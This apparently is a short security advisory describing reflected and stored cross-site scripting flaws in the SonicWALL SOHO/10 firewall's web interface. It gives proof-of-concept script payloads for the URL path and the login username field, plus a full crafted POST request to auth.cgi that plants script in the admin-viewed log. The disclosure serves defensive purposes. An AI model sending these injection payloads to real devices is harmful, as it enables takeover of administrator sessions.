Subject: SonicWALL SOHO/10 - XSS vulnerability


SonicWALL SOHO/10 - XSS and Code Injection vulnerability
========================================================

Product:
========

SonicWall SOHO/10 is the 2nd generation Internet Security Appliance from
Sonicwall, with firewall-, vpn-, contentfiltering- and other capabilities. 


Vulnerability:
==============

There is a Cross Site Scripting Vulnerability in the webroot. 
A HTTP-GET-request, containing script code will be executed
in the webbrowsers environment of the user:


	http://192.168.168.168/<script>alert("Its not magic... its a
sonic")</script>


There is a second vulnerability, which i consider as something between a XSS
and a code-injection vuln,
because the user does not have to follow an html-link to run into the
attack:

If an attacker supplies a username, containing scriptcode, at the login-page
of the device, an entry in the 
system logfile is done, containing the "username".

The system logfile is displayed in html-format. If the appliance admin is
viewing the logfile, the scriptcode
will be executed.

	Because length of input field is limited by the browser (client site), you
can insert a short script
	into the username field to do a quick verification of the existence of the
vuln:

		</TD><script>alert("!")</script>

	To supply longer scripts, you have to modify the request f.e. with a proxy,
or simply sent a modified 
	post request via netcat:

		
		POST http://192.168.168.168:80/auth.cgi HTTP/1.0
		Accept: */*
		Referer: http://192.168.168.168/auth.html
		Accept-Language: de
		Content-Type: application/x-www-form-urlencoded
		Proxy-Connection: Keep-Alive
		User-Agent: BadGuy
		Host: 192.168.168.168
		Content-Length: 160
		Pragma: no-cache

		uName=</TD><script>alert("Its not magic... its a
sonic")</script>&pass=NiceTry&Submit=Login&clientHash=bbe63bb858b02e741d2d12023ee350a1
